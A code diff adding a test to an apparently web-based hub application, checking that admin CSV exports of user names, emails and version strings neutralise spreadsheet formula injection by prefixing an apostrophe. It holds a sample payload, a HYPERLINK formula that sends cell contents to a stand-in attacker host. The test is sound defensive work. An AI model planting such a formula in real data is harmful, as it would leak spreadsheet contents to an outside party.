@@ -561,6 +561,29 @@ def test_a_hub_for_kelvin_accounts_only(tmp_path, monkeypatch):
     assert client.get("/admin/users/1", follow_redirects=False).status_code == 303
 
 
+def test_the_owners_csv_downloads_never_run_as_formulas(tmp_path):
+    """People choose their names and emails, and a Kelvin says what version it is: in a spreadsheet, a cell starting
+    with = + - or @ runs as a formula (=HYPERLINK(...) is a link anywhere). Such cells are kept as text."""
+    pytest.importorskip("cryptography")
+    from labharness.hub import llm
+    from labharness.hub.catalog import Catalog
+    hub, client = make(tmp_path, sharing=False)
+    trap = '=HYPERLINK("https://evil.example/?"&A1,"Open")'
+    r = client.post("/api/register", json={"name": trap, "email": "-1+1@example.org", "password": "correct horse",
+                                           "consent": True, "installation": {"id": "urn:uuid:pc", "name": "PC",
+                                                                             "platform": "win32", "version": "+1+1"}})
+    assert r.status_code == 200, r.text
+    me = hub.authenticate("-1+1@example.org", "correct horse")
+    llm.Gateway(hub, Catalog(hub.home)).record(me, None, "anthropic", "claude-opus-5-5", {
+        "input": 10, "output": 1, "cache_read": 0, "cache_write": 0}, 200)
+    key = hub.ensure_operator_key().read_text(encoding="utf-8").split()[-1]
+    client.post("/admin/signin", data={"key": key})
+    people = list(csv.reader(io.StringIO(client.get("/admin/people.csv").text)))
+    assert (people[1][1], people[1][2], people[1][9]) == ("'" + trap, "'-1+1@example.org", "'+1+1")
+    usage = list(csv.reader(io.StringIO(client.get("/admin/models/usage.csv").text)))
+    assert (usage[1][2], usage[1][3], usage[1][4]) == ("'" + trap, "'-1+1@example.org", "1")   # numbers stay numbers
+
+
 def test_hub_json_edited_while_the_hub_runs_is_taken_in(tmp_path, monkeypatch):
     """Not only when the owner console is used: the hub looks at hub.json every CONFIG_EVERY seconds."""
     import json
